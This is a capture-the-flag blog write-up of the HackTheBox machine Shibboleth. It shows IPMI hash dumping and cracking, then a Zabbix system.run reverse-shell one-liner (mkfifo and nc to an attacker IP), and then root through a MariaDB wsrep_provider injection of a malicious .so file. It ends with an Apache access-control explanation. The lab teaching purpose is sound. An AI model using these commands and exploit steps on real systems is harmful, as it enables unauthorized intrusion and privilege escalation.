---
title: "Hacking Ipmi and Zabbix in Hackthebox - Shibboleth"
date: 2022-04-28T21:43:29+05:30
draft: false
---

![](/images/img-hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-0.png)

# Port Scanning

#### **TCP**

Add `shibboleth.htb` to `/etc/hosts` file.

#### **UDP**

Other ports found were in `open|filtered` STATE and I'm not including them here in the results.

# **Web Server enumeration**

## vHost scanning

We will use `ffuf`to perform vhost scanning.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -o ffuf-vhosts.out -u [http://shibboleth.htb](http://shibboleth.htb) -H -fw 18
```

Found vHosts:

-   monitor
-   monitoring
-   zabbix

All the three vhosts take us to the same page. It is a monitoring tool called **Zabbix.**

There is an authentication bypass for the v5.0 of Zabbix but its not exploitable in the Zabbix application on the server. We are at a dead end.

# UDP Port 623

Doing a quick google search about UDP port 623, I came across IPMI (Intelligent Platform Management Interface) protocol and about Baseboard Management Controllers (BMCs). Check these resources for further understanding:

-   [https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/)
-   [https://book.hacktricks.xyz/pentesting/623-udp-ipmi](https://book.hacktricks.xyz/pentesting/623-udp-ipmi)

I fired up metasploit to use its ipmi modules

![](/images/img-hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-1.png)

We have found an admin hash
```txt
Administrator:836b54da82180000cffc521f48855e4dc4c55663cafc675e4719b43992d8faadc55b2cb9fd8c2d5fa123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:3c62b4109945ae35ba1998f6348ac490bbad6a65
```
Save the output in the hashcat format (by setting the correct options and rerunning the exploit) and use hashcat to crack the hash

```powershell
.\hashcat.exe -D2 -m 7300 .\passwords\shibboleth-ipmi.txt .\rockyou.txt
```
Cracked password: `**ilovepumk********`

Use the password to login as `Administrator` on the Zabbix portal.

# Zabbix Portal

I came across different articles/blogs discussing the exploitation via the Zabbix the API via `/api_jsonrpc.php` but all the requests to that endpoint returned 403 Forbidden status code.

![](/images/img-hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-2.png)

I moved over to check for other ways to somehow get a shell on the system. In the Zabbix console, go to Configuration => Hosts => shibboleth.htb There we have many different pages one of which is `Items`. It contains different commands along with their respective keys. Let's create an item to see all the available items:

![](/images/img-hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-3.png)

There is a specific key called `system.run[command,<mode>]` that looks interesting. It allows us to run commands on the host. We can have RCE on the system.

Reading through the documentation at [https://www.zabbix.com/documentation/5.0/manual](https://www.zabbix.com/documentation/5.0/manual) , I got to know that we just have to set the Key as the following and test if our reverse shell works:

First set up a netcat listener at port 1337 and set the key as follows:

```
system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc YOUR_IP_HERE 1337 >/tmp/f, nowait]
```

The second parameter `nowait` will be needed (default is set to `wait`). Without this parameter, the shell will drop immediately.

![](/images/img-hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-4.png)

# Shell as zabbix user

Now that we have a shell on the system, as `zabbix` user, let's enumerate the system. There is another user account `ipmi-svc`. We need to escalate our privileges to that user to get the user flag. I searched for various things such as config files, processes running on system as other user, etc, but couldn't find anything useful and was on a dead end. Then I came across the config file for ipmi where the credentials of the users are stored.

![](/images/img-hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-5.png)

Although its the same password I have found earlier, I did not try reusing this password on `ipmi-svc` user. Let's try that now :)

The password works on the user and we get a shell as `ipmi-svc`.

# Shell as ipmi-svc user

I began enumeration on the system once again as this user and found an interesting file that is owned by the group `ipmi-svc`. It is the config file for zabbix server.

![](/images/img-hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-6.png)

It contains the database credentials.

I checked the database and table for any password hashes and found a few blowfish hashes.

![](/images/img-hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-7.png)

But I couldn’t crack any hash :(

Time to move on.

# Shell as root

I went back to enumerating the system once again but couldn’t find anything of use. I decided to jump back in to the SQL login and one thing came to my mind was to check the version of the database to see if it’s vulnerable.

![](/images/img-hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-8.png)

The MariaDB version `10.3.25-MariaDB-0ubuntu0.20.04.1`

This version of MariaDB is vulnerable to an OS command injection vulnerability. I found an exploit over here [https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html](https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html)

For this exploit, we need to craft a malicious shared object file(`.so`) file. We will be using msfvenom to craft our exploit. Steps are shown below:

![](/images/img-hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-9.png)

Transfer the malicious `test.so` file to the shibboleth machine. Set up a listener on your local machine and log into mysql:

mysql -u zabbix -p -e 'SET GLOBAL wsrep_provider="/dev/shm/test.so";'

![](/images/img-hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-10.png)

And…we get a shell as root :)

# Beyond root

I’d like to end this with a short beyond root section which I got inspiration from the Beyond Root videos by [@0xdf_](https://twitter.com/0xdf_)(you should definitely check out [his YouTube channel](https://www.youtube.com/c/0xdf0xdf)). I decided to do a little beyond root part for this box as well. We will revisit the part where previously we saw that the Zabbix API endpoint at`/api_jsonrpc.php` was responding with a 403 Forbidden status code. This prevented us to use its API endpoint. Let's check the the apache vhost config file located at`/etc/apache2/sites-enabled/000-default.conf`.

![](/images/img-hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-11.png)

We see that for the Zabbix vHost, these endpoints are set to deny connections from all hosts.

From the Apache documentation,

> _The_ `_<Location>_` _directive limits the scope of the enclosed directives by URL_

In the config file in the box, it is therefore used to explicitly specify the configurations only for the set endpoints. Within the Location directive, we have three more directives set:

-   Order
-   Deny
-   Allow

These are used to control access to particular parts of the server. The access is controlled based on the characteristics of the client such as hostname and IP address. The `Allow` and `Deny` directives specifies which clients can or can’t access the server. The Order directive sets the default access state and configures how the Allow and Deny directives interact with each other.

One thing to take note is that the order in which the lines appear in the configuration file doesn’t matter. All the Allow and Deny lines are processed as seperate groups. However, the ordering in the Order directive itself is of importance. `Order deny,allow` is different from `Order allow,deny`.

In the first one, all the Deny directives are processed first. If the requesting host matches, it is denied unless it also matches the Allow directive. Any other request that do not match any Allow or Deny directive are permitted.

On the latter one, all the Allow directives are processed first. To be allowed, the host of the requesting client must match at least one of them. Else the request will be rejected. Then all the Deny directives are processed. If there is any match, that request is also rejected. Any other request that do not match any Allow or Deny directive are denied by default.

So according to the configuration in the Shibboleth box,
```
Order deny,allow   
Deny from all   
Allow from 127.0.0.1
```
The Order is `deny,allow`. So the Deny directives will be processed first. Here, **all** requests will be denied unless it is from **127.0.0.1**, for which the request will be allowed.

Hope you learned something new in this beyond root section.

I’ll see you around in the next one :)

> Originally written on https://manash01.medium.com/hacking-ipmi-and-zabbix-in-hackthebox-shibboleth-e48c4f235faf